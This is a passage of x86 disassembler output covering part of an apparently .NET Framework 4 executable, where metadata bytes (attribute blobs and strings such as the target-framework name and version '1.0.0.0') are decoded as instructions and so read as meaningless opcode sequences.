  40c981:	04 20                	add    $0x20,%al
  40c983:	01 01                	add    %eax,(%ecx)
  40c985:	0a 04 20             	or     (%eax,%eiz,1),%al
  40c988:	01 01                	add    %eax,(%ecx)
  40c98a:	0b 03                	or     (%ebx),%eax
  40c98c:	20 00                	and    %al,(%eax)
  40c98e:	0b 03                	or     (%ebx),%eax
  40c990:	20 00                	and    %al,(%eax)
  40c992:	0a 03                	or     (%ebx),%al
  40c994:	20 00                	and    %al,(%eax)
  40c996:	0d 05 20 01 01       	or     $0x1012005,%eax
  40c99b:	1d 05 04 20 00       	sbb    $0x200405,%eax
  40c9a0:	1d 05 05 20 02       	sbb    $0x2200505,%eax
  40c9a5:	01 0e                	add    %ecx,(%esi)
  40c9a7:	0e                   	push   %cs
  40c9a8:	05 20 02 01 0e       	add    $0xe010220,%eax
  40c9ad:	08 04 20             	or     %al,(%eax,%eiz,1)
  40c9b0:	01 02                	add    %eax,(%edx)
  40c9b2:	0e                   	push   %cs
  40c9b3:	03 20                	add    (%eax),%esp
  40c9b5:	00 0e                	add    %cl,(%esi)
  40c9b7:	04 20                	add    $0x20,%al
  40c9b9:	01 01                	add    %eax,(%ecx)
  40c9bb:	02 04 20             	add    (%eax,%eiz,1),%al
  40c9be:	01 01                	add    %eax,(%ecx)
  40c9c0:	0c 04                	or     $0x4,%al
  40c9c2:	20 01                	and    %al,(%ecx)
  40c9c4:	01 0d 04 20 00 12    	add    %ecx,0x12002004
  40c9ca:	5c                   	pop    %esp
  40c9cb:	04 20                	add    $0x20,%al
  40c9cd:	00 11                	add    %dl,(%ecx)
  40c9cf:	64 04 20             	fs add $0x20,%al
  40c9d2:	00 12                	add    %dl,(%edx)
  40c9d4:	59                   	pop    %ecx
  40c9d5:	03 28                	add    (%eax),%ebp
  40c9d7:	00 0e                	add    %cl,(%esi)
  40c9d9:	03 28                	add    (%eax),%ebp
  40c9db:	00 0a                	add    %cl,(%edx)
  40c9dd:	03 28                	add    (%eax),%ebp
  40c9df:	00 0d 04 28 00 12    	add    %cl,0x12002804
  40c9e5:	5c                   	pop    %esp
  40c9e6:	04 28                	add    $0x28,%al
  40c9e8:	00 11                	add    %dl,(%ecx)
  40c9ea:	64 04 00             	fs add $0x0,%al
  40c9ed:	00 00                	add    %al,(%eax)
  40c9ef:	00 04 03             	add    %al,(%ebx,%eax,1)
  40c9f2:	00 00                	add    %al,(%eax)
  40c9f4:	00 04 04             	add    %al,(%esp,%eax,1)
  40c9f7:	00 00                	add    %al,(%eax)
  40c9f9:	00 04 05 00 00 00 04 	add    %al,0x4000000(,%eax,1)
  40ca00:	06                   	push   %es
  40ca01:	00 00                	add    %al,(%eax)
  40ca03:	00 04 07             	add    %al,(%edi,%eax,1)
  40ca06:	00 00                	add    %al,(%eax)
  40ca08:	00 04 08             	add    %al,(%eax,%ecx,1)
  40ca0b:	00 00                	add    %al,(%eax)
  40ca0d:	00 04 09             	add    %al,(%ecx,%ecx,1)
  40ca10:	00 00                	add    %al,(%eax)
  40ca12:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40ca15:	00 00                	add    %al,(%eax)
  40ca17:	00 04 0b             	add    %al,(%ebx,%ecx,1)
  40ca1a:	00 00                	add    %al,(%eax)
  40ca1c:	00 06                	add    %al,(%esi)
  40ca1e:	00 02                	add    %al,(%edx)
  40ca20:	0e                   	push   %cs
  40ca21:	12 61 08             	adc    0x8(%ecx),%ah
  40ca24:	05 00 01 0e 12       	add    $0x120e0100,%eax
  40ca29:	61                   	popa
  40ca2a:	06                   	push   %es
  40ca2b:	00 02                	add    %al,(%edx)
  40ca2d:	0e                   	push   %cs
  40ca2e:	05 12 61 05 00       	add    $0x56112,%eax
  40ca33:	01 01                	add    %eax,(%ecx)
  40ca35:	12 61 06             	adc    0x6(%ecx),%ah
  40ca38:	00 02                	add    %al,(%edx)
  40ca3a:	01 12                	add    %edx,(%edx)
  40ca3c:	61                   	popa
  40ca3d:	0e                   	push   %cs
  40ca3e:	07                   	pop    %es
  40ca3f:	00 02                	add    %al,(%edx)
  40ca41:	01 12                	add    %edx,(%edx)
  40ca43:	61                   	popa
  40ca44:	1d 05 06 00 02       	sbb    $0x2000605,%eax
  40ca49:	01 12                	add    %edx,(%edx)
  40ca4b:	61                   	popa
  40ca4c:	0d 06 00 02 01       	or     $0x1020006,%eax
  40ca51:	12 61 0c             	adc    0xc(%ecx),%ah
  40ca54:	06                   	push   %es
  40ca55:	00 02                	add    %al,(%edx)
  40ca57:	01 12                	add    %edx,(%edx)
  40ca59:	61                   	popa
  40ca5a:	02 06                	add    (%esi),%al
  40ca5c:	00 02                	add    %al,(%edx)
  40ca5e:	01 12                	add    %edx,(%edx)
  40ca60:	61                   	popa
  40ca61:	0b 06                	or     (%esi),%eax
  40ca63:	00 02                	add    %al,(%edx)
  40ca65:	01 12                	add    %edx,(%edx)
  40ca67:	61                   	popa
  40ca68:	0a 03                	or     (%ebx),%al
  40ca6a:	06                   	push   %es
  40ca6b:	11 78 04             	adc    %edi,0x4(%eax)
  40ca6e:	20 01                	and    %al,(%ecx)
  40ca70:	01 08                	add    %ecx,(%eax)
  40ca72:	08 01                	or     %al,(%ecx)
  40ca74:	00 08                	add    %cl,(%eax)
  40ca76:	00 00                	add    %al,(%eax)
  40ca78:	00 00                	add    %al,(%eax)
  40ca7a:	00 1e                	add    %bl,(%esi)
  40ca7c:	01 00                	add    %eax,(%eax)
  40ca7e:	01 00                	add    %eax,(%eax)
  40ca80:	54                   	push   %esp
  40ca81:	02 16                	add    (%esi),%dl
  40ca83:	57                   	push   %edi
  40ca84:	72 61                	jb     0x40cae7
  40ca86:	70 4e                	jo     0x40cad6
  40ca88:	6f                   	outsl  %ds:(%esi),(%dx)
  40ca89:	6e                   	outsb  %ds:(%esi),(%dx)
  40ca8a:	45                   	inc    %ebp
  40ca8b:	78 63                	js     0x40caf0
  40ca8d:	65 70 74             	gs jo  0x40cb04
  40ca90:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40ca97:	77 73                	ja     0x40cb0c
  40ca99:	01 05 20 01 01 11    	add    %eax,0x11010120
  40ca9f:	71 08                	jno    0x40caa9
  40caa1:	01 00                	add    %eax,(%eax)
  40caa3:	02 00                	add    (%eax),%al
  40caa5:	00 00                	add    %al,(%eax)
  40caa7:	00 00                	add    %al,(%eax)
  40caa9:	05 01 00 00 00       	add    $0x1,%eax
  40caae:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40cab1:	00 07                	add    %al,(%edi)
  40cab3:	31 2e                	xor    %ebp,(%esi)
  40cab5:	30 2e                	xor    %ch,(%esi)
  40cab7:	30 2e                	xor    %ch,(%esi)
  40cab9:	30 00                	xor    %al,(%eax)
  40cabb:	00 65 01             	add    %ah,0x1(%ebp)
  40cabe:	00 29                	add    %ch,(%ecx)
  40cac0:	2e 4e                	cs dec %esi
  40cac2:	45                   	inc    %ebp
  40cac3:	54                   	push   %esp
  40cac4:	46                   	inc    %esi
  40cac5:	72 61                	jb     0x40cb28
  40cac7:	6d                   	insl   (%dx),%es:(%edi)
  40cac8:	65 77 6f             	gs ja  0x40cb3a
  40cacb:	72 6b                	jb     0x40cb38
  40cacd:	2c 56                	sub    $0x56,%al
  40cacf:	65 72 73             	gs jb  0x40cb45
  40cad2:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40cad9:	30 2c 50             	xor    %ch,(%eax,%edx,2)
  40cadc:	72 6f                	jb     0x40cb4d
  40cade:	66 69 6c 65 3d 43 6c 	imul   $0x6c43,0x3d(%ebp,%eiz,2),%bp
  40cae5:	69 65 6e 74 01 00 54 	imul   $0x54000174,0x6e(%ebp),%esp
  40caec:	0e                   	push   %cs
  40caed:	14 46                	adc    $0x46,%al
  40caef:	72 61                	jb     0x40cb52
  40caf1:	6d                   	insl   (%dx),%es:(%edi)
  40caf2:	65 77 6f             	gs ja  0x40cb64
  40caf5:	72 6b                	jb     0x40cb62
  40caf7:	44                   	inc    %esp
  40caf8:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40caff:	61                   	popa
  40cb00:	6d                   	insl   (%dx),%es:(%edi)
  40cb01:	65 1f                	gs pop %ds
  40cb03:	2e 4e                	cs dec %esi
  40cb05:	45                   	inc    %ebp
  40cb06:	54                   	push   %esp
  40cb07:	20 46 72             	and    %al,0x72(%esi)
  40cb0a:	61                   	popa
  40cb0b:	6d                   	insl   (%dx),%es:(%edi)
  40cb0c:	65 77 6f             	gs ja  0x40cb7e
  40cb0f:	72 6b                	jb     0x40cb7c
  40cb11:	20 34 20             	and    %dh,(%eax,%eiz,1)
  40cb14:	43                   	inc    %ebx
  40cb15:	6c                   	insb   (%dx),%es:(%edi)
  40cb16:	69 65 6e 74 20 50 72 	imul   $0x72502074,0x6e(%ebp),%esp
  40cb1d:	6f                   	outsl  %ds:(%esi),(%dx)
  40cb1e:	66 69 6c 65 09 01 00 	imul   $0x1,0x9(%ebp,%eiz,2),%bp
  40cb25:	04 49                	add    $0x49,%al
  40cb27:	74 65                	je     0x40cb8e
  40cb29:	6d                   	insl   (%dx),%es:(%edi)
  40cb2a:	00 00                	add    %al,(%eax)
  40cb2c:	03 07                	add    (%edi),%eax
  40cb2e:	01 08                	add    %ecx,(%eax)
  40cb30:	04 00                	add    $0x0,%al
  40cb32:	01 08                	add    %ecx,(%eax)
  40cb34:	0e                   	push   %cs
  40cb35:	03 07                	add    (%edi),%eax
  40cb37:	01 02                	add    %eax,(%edx)
  40cb39:	05 00 00 12 80       	add    $0x80120000,%eax
  40cb3e:	b1 05                	mov    $0x5,%cl
  40cb40:	20 01                	and    %al,(%ecx)
  40cb42:	0e                   	push   %cs
  40cb43:	1d 05 05 20 00       	sbb    $0x200505,%eax
  40cb48:	12 80 b5 05 20 00    	adc    0x2005b5(%eax),%al
  40cb4e:	12 80 b9 05 20 01    	adc    0x12005b9(%eax),%al
  40cb54:	1d 05 0e 08 20       	sbb    $0x20080e05,%eax
  40cb59:	03 02                	add    (%edx),%eax
  40cb5b:	1d 05 0e 1d 05       	sbb    $0x51d0e05,%eax
  40cb60:	14 07                	adc    $0x7,%al
  40cb62:	08 0e                	or     %cl,(%esi)
  40cb64:	08 1d 12 80 c9 08    	or     %bl,0x8c98012
  40cb6a:	12 80 c9 12 80 cd    	adc    -0x327fed37(%eax),%al
  40cb70:	12 80 d1 1d 0e 0c    	adc    0xc0e1dd1(%eax),%al
  40cb76:	20 03                	and    %al,(%ebx)
  40cb78:	01 11                	add    %edx,(%ecx)
  40cb7a:	80 d5 11             	adc    $0x11,%ch
  40cb7d:	80 d9 11             	sbb    $0x11,%cl
  40cb80:	80 dd 05             	sbb    $0x5,%ch
  40cb83:	00 02                	add    %al,(%edx)
  40cb85:	02 0e                	add    (%esi),%cl
  40cb87:	0e                   	push   %cs
  40cb88:	06                   	push   %es
  40cb89:	20 01                	and    %al,(%ecx)
  40cb8b:	1d 0e 1d 03 04       	sbb    $0x4031d0e,%eax
  40cb90:	20 01                	and    %al,(%ecx)
  40cb92:	08 08                	or     %cl,(%eax)
  40cb94:	07                   	pop    %es
  40cb95:	00 01                	add    %al,(%ecx)
  40cb97:	1d 12 80 c9 0e       	sbb    $0xec98012,%eax
  40cb9c:	07                   	pop    %es
  40cb9d:	20 02                	and    %al,(%edx)
  40cb9f:	01 12                	add    %edx,(%edx)
  40cba1:	80 c9 08             	or     $0x8,%cl
  40cba4:	06                   	push   %es
  40cba5:	20 01                	and    %al,(%ecx)
  40cba7:	01 12                	add    %edx,(%edx)
  40cba9:	80 f1 09             	xor    $0x9,%cl
  40cbac:	20 02                	and    %al,(%edx)
  40cbae:	1d 0e 1d 0e 11       	sbb    $0x110e1d0e,%eax
  40cbb3:	80 f5 05             	xor    $0x5,%ch
  40cbb6:	20 02                	and    %al,(%edx)
  40cbb8:	08 08                	or     %cl,(%eax)
  40cbba:	08 06                	or     %al,(%esi)
  40cbbc:	20 02                	and    %al,(%edx)
  40cbbe:	01 12                	add    %edx,(%edx)
  40cbc0:	0d 02 05 20 02       	or     $0x2200502,%eax
  40cbc5:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
  40cbc8:	09 20                	or     %esp,(%eax)
  40cbca:	03 01                	add    (%ecx),%eax
  40cbcc:	12 61 02             	adc    0x2(%ecx),%ah
  40cbcf:	12 81 01 05 20 00    	adc    0x200501(%ecx),%al
  40cbd5:	12 81 05 0b 20 04    	adc    0x4200b05(%ecx),%al
  40cbdb:	01 0e                	add    %ecx,(%esi)
  40cbdd:	12 81 09 11 81 0d    	adc    0xd811109(%ecx),%al
  40cbe3:	02 09                	add    (%ecx),%cl
  40cbe5:	20 04 01             	and    %al,(%ecx,%eax,1)
  40cbe8:	12 81 15 1c 08 08    	adc    0x8081c15(%ecx),%al
  40cbee:	0c 20                	or     $0x20,%al
  40cbf0:	05 12 25 1d 05       	add    $0x51d2512,%eax
  40cbf5:	08 08                	or     %cl,(%eax)
  40cbf7:	12 81 19 1c 06 00    	adc    0x61c19(%ecx),%al
  40cbfd:	01 11                	add    %edx,(%ecx)
  40cbff:	81 21 0e 05 20 01    	andl   $0x120050e,(%ecx)
  40cc05:	02 12                	add    (%edx),%dl
  40cc07:	19 04 07             	sbb    %eax,(%edi,%eax,1)
  40cc0a:	02 08                	add    (%eax),%cl
  40cc0c:	08 05 20 01 08 12    	or     %al,0x12080120
  40cc12:	25 06 00 02 08       	and    $0x8020006,%eax
  40cc17:	1d 05 08 07 20       	sbb    $0x20070805,%eax
  40cc1c:	03 08                	add    (%eax),%ecx
  40cc1e:	1d 05 08 08 06       	sbb    $0x6080805,%eax
  40cc23:	20 01                	and    %al,(%ecx)
  40cc25:	01 12                	add    %edx,(%edx)
  40cc27:	81 29 04 20 01 01    	subl   $0x1012004,(%ecx)
  40cc2d:	1c 0c                	sbb    $0xc,%al
  40cc2f:	07                   	pop    %es
  40cc30:	06                   	push   %es
  40cc31:	1c 02                	sbb    $0x2,%al
  40cc33:	1d 05 12 81 2d       	sbb    $0x2d811205,%eax
  40cc38:	08 1d 05 06 00 02    	or     %bl,0x2000605
  40cc3e:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  40cc41:	02 07                	add    (%edi),%al
  40cc43:	20 02                	and    %al,(%edx)
  40cc45:	02 08                	add    (%eax),%cl
  40cc47:	11 81 35 07 20 03    	adc    %eax,0x3200735(%ecx)
  40cc4d:	01 1d 05 08 08 1a    	add    %ebx,0x1a080805
  40cc53:	07                   	pop    %es
  40cc54:	0a 12                	or     (%edx),%dl
  40cc56:	81 3d 0e 1d 12 81 41 	cmpl   $0x81120841,0x81121d0e
  40cc5d:	08 12 81 
  40cc60:	41                   	inc    %ecx
  40cc61:	12 81 45 12 81 49    	adc    0x49811245(%ecx),%al
  40cc67:	1d 05 0e 12 81       	sbb    $0x81120e05,%eax
  40cc6c:	4d                   	dec    %ebp
  40cc6d:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40cc72:	0e                   	push   %cs
  40cc73:	05 00 00 12 81       	add    $0x81120000,%eax
  40cc78:	41                   	inc    %ecx
  40cc79:	05 20 00 12 81       	add    $0x81120020,%eax
  40cc7e:	55                   	push   %ebp
  40cc7f:	06                   	push   %es
  40cc80:	00 00                	add    %al,(%eax)
  40cc82:	1d 12 81 41 05       	sbb    $0x5418112,%eax
  40cc87:	00 01                	add    %al,(%ecx)
  40cc89:	0e                   	push   %cs
  40cc8a:	1d 0e 06 20 01       	sbb    $0x120060e,%eax
  40cc8f:	01 11                	add    %edx,(%ecx)
  40cc91:	81 5d 08 00 01 12 81 	sbbl   $0x81120100,0x8(%ebp)
  40cc98:	41                   	inc    %ecx
  40cc99:	12 81 45 04 06 12    	adc    0x12060445(%ecx),%al
  40cc9f:	81 49 09 20 02 12 81 	orl    $0x81120220,0x9(%ecx)
  40cca6:	49                   	dec    %ecx
  40cca7:	0e                   	push   %cs
  40cca8:	11 81 69 06 00 03    	adc    %eax,0x3000669(%ecx)
  40ccae:	0e                   	push   %cs
  40ccaf:	0e                   	push   %cs
  40ccb0:	0e                   	push   %cs
  40ccb1:	0e                   	push   %cs
  40ccb2:	05 20 02 01 0e       	add    $0xe010220,%eax
  40ccb7:	1c 07                	sbb    $0x7,%al
  40ccb9:	20 02                	and    %al,(%edx)
  40ccbb:	01 0e                	add    %ecx,(%esi)
  40ccbd:	11 81 75 04 07 02    	adc    %eax,0x2070475(%ecx)
  40ccc3:	0a 02                	or     (%edx),%al
  40ccc5:	10 07                	adc    %al,(%edi)
  40ccc7:	06                   	push   %es
  40ccc8:	12 81 85 12 81 89    	adc    -0x767eed7b(%ecx),%al
  40ccce:	12 81 8d 12 81 91    	adc    -0x6e7eed73(%ecx),%al
  40ccd4:	0e                   	push   %cs
  40ccd5:	02 05 20 00 12 81    	add    0x81120020,%al
  40ccdb:	89 05 20 00 12 81    	mov    %eax,0x81120020
  40cce1:	8d 05 20 00 12 81    	lea    0x81120020,%eax
  40cce7:	91                   	xchg   %eax,%ecx
  40cce8:	04 20                	add    $0x20,%al
  40ccea:	01 1c 0e             	add    %ebx,(%esi,%ecx,1)
  40cced:	04 07                	add    $0x7,%al
  40ccef:	02 02                	add    (%edx),%al
  40ccf1:	02 03                	add    (%ebx),%al
  40ccf3:	20 00                	and    %al,(%eax)
  40ccf5:	18 04 07             	sbb    %al,(%edi,%eax,1)
  40ccf8:	02 18                	add    (%eax),%bl
  40ccfa:	02 03                	add    (%ebx),%al
  40ccfc:	07                   	pop    %es
  40ccfd:	01 0e                	add    %ecx,(%esi)
  40ccff:	05 00 00 12 81       	add    $0x81120000,%eax
  40cd04:	9d                   	popf
  40cd05:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40cd0a:	1c 0a                	sbb    $0xa,%al
  40cd0c:	07                   	pop    %es
  40cd0d:	05 1d 05 12 35       	add    $0x3512051d,%eax
  40cd12:	1d 05 08 05 05       	sbb    $0x5050805,%eax
  40cd17:	20 01                	and    %al,(%ecx)
  40cd19:	12 35 0e 05 20 02    	adc    0x220050e,%dh
  40cd1f:	0e                   	push   %cs
  40cd20:	08 08                	or     %cl,(%eax)
  40cd22:	06                   	push   %es
  40cd23:	07                   	pop    %es
  40cd24:	02 02                	add    (%edx),%al
  40cd26:	11 81 ad 05 20 02    	adc    %eax,0x22005ad(%ecx)
  40cd2c:	0e                   	push   %cs
  40cd2d:	0e                   	push   %cs
  40cd2e:	0e                   	push   %cs
  40cd2f:	05 20 00 11 81       	add    $0x81110020,%eax
  40cd34:	ad                   	lods   %ds:(%esi),%eax
  40cd35:	05 00 00 12 81       	add    $0x81120000,%eax
  40cd3a:	b9 06 20 01 01       	mov    $0x1012006,%ecx
  40cd3f:	12 81 b9 06 20 01    	adc    0x12006b9(%ecx),%al
  40cd45:	02 11                	add    (%ecx),%dl
  40cd47:	81 c1 11 07 05 12    	add    $0x12050711,%ecx
  40cd4d:	81 85 15 12 41 01 0e 	addl   $0x8d81120e,0x1411215(%ebp)
  40cd54:	12 81 8d 
  40cd57:	12 81 91 0e 05 15    	adc    0x15050e91(%ecx),%al
  40cd5d:	12 41 01             	adc    0x1(%ecx),%al
  40cd60:	0e                   	push   %cs
  40cd61:	05 20 01 01 13       	add    $0x13010120,%eax
  40cd66:	00 05 20 00 1d 13    	add    %al,0x131d0020
  40cd6c:	00 06                	add    %al,(%esi)
  40cd6e:	00 02                	add    %al,(%edx)
  40cd70:	0e                   	push   %cs
  40cd71:	0e                   	push   %cs
  40cd72:	1d 0e 08 07 03       	sbb    $0x307080e,%eax
  40cd77:	1d 12 29 08 12       	sbb    $0x12082912,%eax
  40cd7c:	29 05 00 00 1d 12    	sub    %eax,0x121d0000
  40cd82:	29 05 20 00 11 81    	sub    %eax,0x81110020
  40cd88:	c5 09                	lds    (%ecx),%ecx
  40cd8a:	00 02                	add    %al,(%edx)
  40cd8c:	02 11                	add    (%ecx),%dl
  40cd8e:	81 c5 11 81 c5 05    	add    $0x5c58111,%ebp
  40cd94:	07                   	pop    %es
  40cd95:	02 12                	add    (%edx),%dl
  40cd97:	35 0e 07 20 03       	xor    $0x320070e,%eax
  40cd9c:	01 02                	add    %eax,(%edx)
  40cd9e:	0e                   	push   %cs
  40cd9f:	10 02                	adc    %al,(%edx)
  40cda1:	06                   	push   %es
  40cda2:	00 01                	add    %al,(%ecx)
  40cda4:	01 12                	add    %edx,(%edx)
  40cda6:	81 cd 06 07 02 12    	or     $0x12020706,%ebp
  40cdac:	81 49 02 08 20 03 01 	orl    $0x1032008,0x2(%ecx)
  40cdb3:	0e                   	push   %cs
  40cdb4:	1c 11                	sbb    $0x11,%al
  40cdb6:	81 d5 07 07 02 12    	adc    $0x12020707,%ebp
  40cdbc:	81 49 1d 05 06 20 01 	orl    $0x1200605,0x1d(%ecx)
  40cdc3:	12 81 49 0e 02 1d    	adc    0x1d020e49(%ecx),%al
  40cdc9:	05 07 20 02 12       	add    $0x12022007,%eax
  40cdce:	81 49 0e 02 0e 07 04 	orl    $0x4070e02,0xe(%ecx)
  40cdd5:	12 60 0e             	adc    0xe(%eax),%ah
  40cdd8:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40cddd:	12 60 12             	adc    0x12(%eax),%ah
  40cde0:	60                   	pusha
  40cde1:	06                   	push   %es
  40cde2:	15 12 41 01 12       	adc    $0x12014112,%eax
  40cde7:	60                   	pusha
  40cde8:	10 10                	adc    %dl,(%eax)
  40cdea:	01 01                	add    %eax,(%ecx)
  40cdec:	15 12 41 01 1e       	adc    $0x1e014112,%eax
  40cdf1:	00 15 12 81 e1 01    	add    %dl,0x1e18112
  40cdf7:	1e                   	push   %ds
  40cdf8:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40cdfb:	01 12                	add    %edx,(%edx)
  40cdfd:	60                   	pusha
  40cdfe:	09 20                	or     %esp,(%eax)
  40ce00:	00 15 11 81 d9 01    	add    %dl,0x1d98111
  40ce06:	13 00                	adc    (%eax),%eax
  40ce08:	07                   	pop    %es
  40ce09:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40ce0e:	12 60 04             	adc    0x4(%eax),%ah
  40ce11:	20 00                	and    %al,(%eax)
  40ce13:	13 00                	adc    (%eax),%eax
  40ce15:	05 20 01 02 13       	add    $0x13020120,%eax
  40ce1a:	00 03                	add    %al,(%ebx)
  40ce1c:	07                   	pop    %es
  40ce1d:	01 1c 05 00 00 12 81 	add    %ebx,-0x7eee0000(,%eax,1)
  40ce24:	e5 07                	in     $0x7,%eax
  40ce26:	20 01                	and    %al,(%ecx)
  40ce28:	12 81 e9 1d 05 06    	adc    0x6051de9(%ecx),%al
  40ce2e:	20 01                	and    %al,(%ecx)
  40ce30:	12 81 ed 0e 06 00    	adc    0x60eed(%ecx),%al
  40ce36:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40ce39:	81 ed 08 00 01 12    	sub    $0x12010008,%ebp
  40ce3f:	81 ed 11 81 f5 09    	sub    $0x9f58111,%ebp
  40ce45:	00 02                	add    %al,(%edx)
  40ce47:	12 81 f9 11 81 fd    	adc    -0x27eee07(%ecx),%al
  40ce4d:	0e                   	push   %cs
  40ce4e:	1c 00                	sbb    $0x0,%al
  40ce50:	05 12 82 05 11       	add    $0x11058212,%eax
  40ce55:	82 09 0e             	orb    $0xe,(%ecx)
  40ce58:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40ce5d:	12 81 ed 12 81 ed    	adc    -0x127eed13(%ecx),%al
  40ce63:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40ce68:	12 81 f9 17 15 12    	adc    0x121517f9(%ecx),%al
  40ce6e:	45                   	inc    %ebp
  40ce6f:	01 15 12 49 0a 12    	add    %edx,0x120a4912
  40ce75:	4d                   	dec    %ebp
  40ce76:	1c 12                	sbb    $0x12,%al
  40ce78:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40ce7d:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40ce82:	0e                   	push   %cs
  40ce83:	0b 00                	or     (%eax),%eax
  40ce85:	01 15 12 45 01 13    	add    %edx,0x13014512
  40ce8b:	00 12                	add    %dl,(%edx)
  40ce8d:	82 05 03 06 13 00 13 	addb   $0x13,0x130603
  40ce94:	15 12 49 0a 12       	adc    $0x120a4912,%eax
  40ce99:	4d                   	dec    %ebp
  40ce9a:	1c 12                	sbb    $0x12,%al
  40ce9c:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40cea1:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40cea6:	0e                   	push   %cs
  40cea7:	17                   	pop    %ss
  40cea8:	20 0a                	and    %cl,(%edx)
  40ceaa:	01 13                	add    %edx,(%ebx)
  40ceac:	00 13                	add    %dl,(%ebx)
  40ceae:	01 13                	add    %edx,(%ebx)
  40ceb0:	02 13                	add    (%ebx),%dl
  40ceb2:	03 13                	add    (%ebx),%edx
  40ceb4:	04 13                	add    $0x13,%al
  40ceb6:	05 13 06 13 07       	add    $0x7130613,%eax
  40cebb:	13 08                	adc    (%eax),%ecx
  40cebd:	13 09                	adc    (%ecx),%ecx
  40cebf:	05 07 01 12 82       	add    $0x82120107,%eax
  40cec4:	0d 07 20 03 01       	or     $0x1032007,%eax
  40cec9:	0e                   	push   %cs
  40ceca:	1d 05 08 05 20       	sbb    $0x20050805,%eax
  40cecf:	01 1d 05 08 12 07    	add    %ebx,0x7120805
  40ced5:	06                   	push   %es
  40ced6:	12 81 2d 12 82 19    	adc    0x1982122d(%ecx),%al
  40cedc:	12 82 1d 12 82 21    	adc    0x2182121d(%edx),%al
  40cee2:	1d 05 1d 05 06       	sbb    $0x6051d05,%eax
  40cee7:	20 01                	and    %al,(%ecx)
  40cee9:	01 11                	add    %edx,(%ecx)
  40ceeb:	82 2d 06 20 01 01 11 	subb   $0x11,0x1012006
  40cef2:	82 31 05             	xorb   $0x5,(%ecx)
  40cef5:	20 00                	and    %al,(%eax)
  40cef7:	12 82 35 0b 20 03    	adc    0x3200b35(%edx),%al
  40cefd:	01 12                	add    %edx,(%edx)
  40ceff:	61                   	popa
  40cf00:	12 82 35 11 82 39    	adc    0x39821135(%edx),%al
  40cf06:	08 20                	or     %ah,(%eax)
  40cf08:	03 1d 05 1d 05 08    	add    0x8051d05,%ebx
  40cf0e:	08 1a                	or     %bl,(%edx)
  40cf10:	07                   	pop    %es
  40cf11:	0a 12                	or     (%edx),%dl
  40cf13:	81 2d 12 82 19 12 82 	subl   $0x51d2182,0x12198212
  40cf1a:	21 1d 05 
  40cf1d:	1d 05 1d 05 12       	sbb    $0x12051d05,%eax
  40cf22:	82 1d 1d 05 1d 05 1d 	sbbb   $0x1d,0x51d051d
  40cf29:	05 0c 00 05 01       	add    $0x105000c,%eax
  40cf2e:	12 82 45 08 12 82    	adc    -0x7dedf7bb(%edx),%al
  40cf34:	45                   	inc    %ebp
  40cf35:	08 08                	or     %cl,(%eax)
  40cf37:	04 07                	add    $0x7,%al
  40cf39:	02 02                	add    (%edx),%al
  40cf3b:	08 09                	or     %cl,(%ecx)
  40cf3d:	00 02                	add    %al,(%edx)
  40cf3f:	01 12                	add    %edx,(%edx)
  40cf41:	82 45 11 82          	addb   $0x82,0x11(%ebp)
  40cf45:	4d                   	dec    %ebp
  40cf46:	0d 07 06 1d 05       	or     $0x51d0607,%eax
  40cf4b:	12 82 51 12 35 1d    	adc    0x1d351251(%edx),%al
  40cf51:	05 08 05 07 07       	add    $0x7070508,%eax
  40cf56:	02 12                	add    (%edx),%dl
  40cf58:	82 51 1d 05          	adcb   $0x5,0x1d(%ecx)
  40cf5c:	08 07                	or     %al,(%edi)
  40cf5e:	04 12                	add    $0x12,%al
  40cf60:	35 1d 05 08 05       	xor    $0x508051d,%eax
  40cf65:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40cf6a:	1c 06                	sbb    $0x6,%al
  40cf6c:	07                   	pop    %es
  40cf6d:	03 1d 05 08 08 05    	add    0x5080805,%ebx
  40cf73:	20 01                	and    %al,(%ecx)
  40cf75:	13 00                	adc    (%eax),%eax
  40cf77:	08 04 07             	or     %al,(%edi,%eax,1)
  40cf7a:	01 12                	add    %edx,(%edx)
  40cf7c:	60                   	pusha
  40cf7d:	0e                   	push   %cs
  40cf7e:	07                   	pop    %es
  40cf7f:	05 08 08 0e 15       	add    $0x150e0808,%eax
  40cf84:	11 81 d9 01 12 60    	adc    %eax,0x601201d9(%ecx)
  40cf8a:	12 60 07             	adc    0x7(%eax),%ah
  40cf8d:	07                   	pop    %es
  40cf8e:	04 08                	add    $0x8,%al
  40cf90:	05 1d 05 08 04       	add    $0x408051d,%eax
  40cf95:	20 01                	and    %al,(%ecx)
  40cf97:	01 05 04 07 01 11    	add    %eax,0x11010704
  40cf9d:	64 04 00             	fs add $0x0,%al
  40cfa0:	01 0b                	add    %ecx,(%ebx)
  40cfa2:	0a 04 00             	or     (%eax,%eax,1),%al
  40cfa5:	01 0b                	add    %ecx,(%ebx)
  40cfa7:	0e                   	push   %cs
  40cfa8:	04 00                	add    $0x0,%al
  40cfaa:	01 0b                	add    %ecx,(%ebx)
  40cfac:	0d 04 00 01 0b       	or     $0xb010004,%eax
  40cfb1:	0c 06                	or     $0x6,%al
  40cfb3:	00 01                	add    %al,(%ecx)
  40cfb5:	0b 11                	or     (%ecx),%edx
  40cfb7:	81 ad 04 00 01 0a 0a 	subl   $0x100040a,0xa010004(%ebp)
  40cfbe:	04 00 01 
  40cfc1:	0a 0e                	or     (%esi),%cl
  40cfc3:	04 00                	add    $0x0,%al
  40cfc5:	01 0a                	add    %ecx,(%edx)
  40cfc7:	0d 04 00 01 0a       	or     $0xa010004,%eax
